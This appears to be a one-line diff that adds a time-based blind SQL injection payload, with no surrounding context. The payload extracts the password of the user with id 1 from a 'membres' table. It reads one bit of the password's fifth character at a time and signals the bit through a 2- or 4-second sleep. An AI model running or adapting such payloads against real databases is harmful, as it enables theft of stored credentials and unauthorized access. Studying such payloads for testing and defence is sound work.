@@ -1,0 +1,1 @@
+select (case field(concat(substring(bin(ascii(substring(password,5,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1)
